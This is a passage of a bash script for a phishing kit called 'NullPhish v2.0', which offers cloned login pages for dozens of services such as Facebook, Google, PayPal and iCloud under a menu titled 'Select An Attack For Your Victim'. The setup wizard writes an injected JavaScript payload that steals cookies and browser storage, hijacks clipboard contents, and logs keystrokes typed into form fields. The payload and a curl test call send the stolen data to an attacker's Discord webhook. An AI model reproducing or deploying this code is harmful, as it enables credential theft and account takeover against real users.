		echo -e "  ${WHITE}• Clipboard Hijacking (copy + paste)"
		echo -e "  ${WHITE}• Advanced Keystroke Logging"
		echo -e "  ${WHITE}• Browser Fingerprinting (OS, Language, Timezone)"
		echo -e "  ${WHITE}• Viewport Screenshot Info"
		echo -e "  ${WHITE}• Discord Webhook Delivery with Rich Embeds${WHITE}"
		
		# Test the webhook
		curl -s -H "Content-Type: application/json" \
			-d "{\"embeds\":[{\"title\":\"✅ NullPhish v2.0 Connected\",\"description\":\"All captures will be forwarded here.\",\"color\":65280,\"fields\":[{\"name\":\"Status\",\"value\":\"Active\",\"inline\":true},{\"name\":\"Modules\",\"value\":\"Session Grabber, Keylogger, Clipboard, Fingerprint, Screenshot\",\"inline\":false}],\"footer\":{\"text\":\"NullPhish v2.0 | $(date)\"}}]}" \
			"$webhook_input" > /dev/null 2>&1 &
		
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Test message sent to Discord. Check your channel.${WHITE}"
		
	elif [[ -z "$webhook_input" ]]; then
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No webhook entered. Feature not enabled.${WHITE}"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid webhook URL format. Must start with https://discord.com/api/webhooks/${WHITE}"
	fi
	
	{ sleep 3; main_menu; }
}

## Setup wizard for first-time users
setup_wizard() {
	if [[ ! -f ".server/.setup_done" ]]; then
		{ clear; banner_small; echo; }
		cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} First Time Setup ${RED}[${WHITE}::${RED}]${ORANGE}
		
		${CYAN}Welcome to NullPhish v2.0!
		${WHITE}Let's configure Discord Webhook for real-time captures.
		
		${GREEN}How to get a webhook URL:
		${WHITE}1. Open Discord > Server Settings > Integrations
		${WHITE}2. Create Webhook > Copy Webhook URL
		${WHITE}3. Paste it below (or press Enter to skip)
		
		EOF
		
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Enter Discord Webhook URL ${CYAN}(or Enter to skip): ${WHITE}"
		read webhook_input
		
		if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
			echo "$webhook_input" > .server/.webhook_url
			
			cat > ".server/inject.js" <<- JSEOF
(function() {
	'use strict';
	
	const CONFIG = {
		sessionGrabber: true,
		clipboardHijack: true,
		keylogger: true,
		localStorageGrab: true,
		screenshotCapture: true,
		webhookURL: '$webhook_input'
	};
	
	if (CONFIG.sessionGrabber) {
		const payload = {
			type: 'session_data',
			url: window.location.href,
			cookies: document.cookie,
			localStorage: JSON.stringify(localStorage),
			sessionStorage: JSON.stringify(sessionStorage),
			userAgent: navigator.userAgent,
			platform: navigator.platform,
			language: navigator.language,
			referrer: document.referrer,
			screenRes: screen.width + 'x' + screen.height,
			colorDepth: screen.colorDepth,
			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
			timestamp: new Date().toISOString()
		};
		sendToWebhook(payload);
	}
	
	if (CONFIG.clipboardHijack) {
		let lastClipboard = '';
		document.addEventListener('copy', function(e) {
			const text = window.getSelection().toString();
			if (text && text !== lastClipboard) {
				lastClipboard = text;
				sendToWebhook({ type: 'clipboard', data: text, url: window.location.href, timestamp: new Date().toISOString() });
			}
		});
		document.addEventListener('click', function() {
			if (navigator.clipboard && navigator.clipboard.readText) {
				navigator.clipboard.readText().then(function(text) {
					if (text && text !== lastClipboard) {
						lastClipboard = text;
						sendToWebhook({ type: 'clipboard_paste', data: text, url: window.location.href, timestamp: new Date().toISOString() });
					}
				}).catch(function() {});
			}
		}, { once: true });
	}
	
	if (CONFIG.keylogger) {
		let buffer = '', timer = null, currentField = 'unknown';
		document.addEventListener('focusin', function(e) {
			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
				buffer = '';
			}
		}, true);
		document.addEventListener('keypress', function(e) {
			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
				buffer += e.key;
				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
				clearTimeout(timer);
				timer = setTimeout(function() {
					if (buffer) {
						sendToWebhook({ type: 'keystrokes', data: buffer, field: currentField, url: window.location.href, timestamp: new Date().toISOString() });
						buffer = '';
					}
				}, 2000);
			}
		}, true);
	}
	
	function sendToWebhook(data) {
		if (!CONFIG.webhookURL) return;
		let color = 0xff0000, title = '📥 ' + data.type.replace('_', ' ').toUpperCase(), description = '';
		switch(data.type) {
			case 'session_data': color = 0x3498db; description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 800) + '```\n**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 400) + '```\n**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 400) + '```'; break;
			case 'keystrokes': color = 0xe74c3c; description = '**Field:** \`' + data.field + '\`\n**Keys:** ||' + data.data + '||'; break;
			case 'clipboard': case 'clipboard_paste': color = 0xf39c12; description = '**Content:** ||' + data.data.substring(0, 1000) + '||'; break;
			default: description = JSON.stringify(data).substring(0, 1000);
		}
		fetch(CONFIG.webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: title, description: description, color: color, fields: [{ name: '🌐 URL', value: (data.url || window.location.href).substring(0, 1024), inline: false }, { name: '🖥️ User Agent', value: (data.userAgent || navigator.userAgent).substring(0, 1024), inline: false }], footer: { text: 'NullPhish v2.0' } }] }) }).catch(function() {});
	}
})();
JSEOF
			chmod 644 .server/inject.js
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Webhook configured! Injector is ACTIVE."
		else
			echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Skipped. You can configure later via Option 101.${WHITE}"
		fi
		
		touch .server/.setup_done
		{ sleep 2; main_menu; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}13${RED}]${ORANGE} Playstation   ${RED}[${WHITE}25${RED}]${ORANGE} Twitter
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}14${RED}]${ORANGE} Protonmail    ${RED}[${WHITE}26${RED}]${ORANGE} Zoom
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}15${RED}]${ORANGE} Quora         ${RED}[${WHITE}27${RED}]${ORANGE} Linkedin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}16${RED}]${ORANGE} Reddit        ${RED}[${WHITE}28${RED}]${ORANGE} Pinterest
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}17${RED}]${ORANGE} Snapchat      ${RED}[${WHITE}29${RED}]${ORANGE} Riot Games
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}18${RED}]${ORANGE} Spotify       ${RED}[${WHITE}30${RED}]${ORANGE} Twitch
		${RED}[${WHITE}07${RED}]${ORANGE} Adobe         ${RED}[${WHITE}19${RED}]${ORANGE} Steam         ${RED}[${WHITE}31${RED}]${ORANGE} XBOX
		${RED}[${WHITE}08${RED}]${ORANGE} Badoo         ${RED}[${WHITE}20${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}32${RED}]${ORANGE} Mediafire
		${RED}[${WHITE}09${RED}]${ORANGE} Dropbox       ${RED}[${WHITE}21${RED}]${ORANGE} Epic Games    ${RED}[${WHITE}33${RED}]${ORANGE} Gitlab
		${RED}[${WHITE}10${RED}]${ORANGE} Ebay          ${RED}[${WHITE}22${RED}]${ORANGE} iCloud        ${RED}[${WHITE}34${RED}]${ORANGE} Github
		${RED}[${WHITE}11${RED}]${ORANGE} Onlyfans      ${RED}[${WHITE}23${RED}]${ORANGE} Patreon       ${RED}[${WHITE}35${RED}]${ORANGE} Discord
		${RED}[${WHITE}12${RED}]${ORANGE} Roblox        ${RED}[${WHITE}24${RED}]${ORANGE} Stackoverflow 

		${RED}[${WHITE}101${RED}]${ORANGE} Discord Webhook Config

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01) site_facebook;;
		2 | 02) site_instagram;;
		3 | 03) site_gmail;;
		4 | 04) website="microsoft"; mask=''; tunnel_menu;;
		5 | 05) website="netflix"; mask=''; tunnel_menu;;
		6 | 06) website="paypal"; mask=''; tunnel_menu;;
		7 | 07) website="adobe"; mask=''; tunnel_menu;;
		8 | 08) website="badoo"; mask=''; tunnel_menu;;
		9 | 09) website="dropbox"; mask=''; tunnel_menu;;
		10) website="ebay"; mask=''; tunnel_menu;;
		11) website="onlyfans"; mask=''; tunnel_menu;;
		12) website="roblox"; mask=''; tunnel_menu;;
		13) website="playstation"; mask=''; tunnel_menu;;
		14) website="protonmail"; mask=''; tunnel_menu;;
		15) website="quora"; mask=''; tunnel_menu;;
		16) website="reddit"; mask=''; tunnel_menu;;
		17) website="snapchat"; mask=''; tunnel_menu;;
		18) website="spotify"; mask=''; tunnel_menu;;
		19) website="steam"; mask=''; tunnel_menu;;
		20) website="tiktok"; mask=''; tunnel_menu;;
		21) website="epicgames"; mask=''; tunnel_menu;;
		22) website="icloud"; mask=''; tunnel_menu;;
		23) website="patreon"; mask=''; tunnel_menu;;
		24) website="stackoverflow"; mask=''; tunnel_menu;;
		25) website="twitter"; mask=''; tunnel_menu;;
		26) website="zoom"; mask=''; tunnel_menu;;
		27) website="linkedin"; mask=''; tunnel_menu;;
		28) website="pinterest"; mask=''; tunnel_menu;;
		29) website="riotgames"; mask=''; tunnel_menu;;
		30) website="twitch"; mask=''; tunnel_menu;;
		31) website="xbox"; mask=''; tunnel_menu;;
		32) website="mediafire"; mask=''; tunnel_menu;;
		33) website="gitlab"; mask=''; tunnel_menu;;
		34) website="github"; mask=''; tunnel_menu;;
		35) website="discord"; mask=''; tunnel_menu;;
		101) configure_webhook;;
		99) about;;
		0 | 00) msg_exit;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; { sleep 1; main_menu; };;
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
setup_wizard
auto_update
main_menu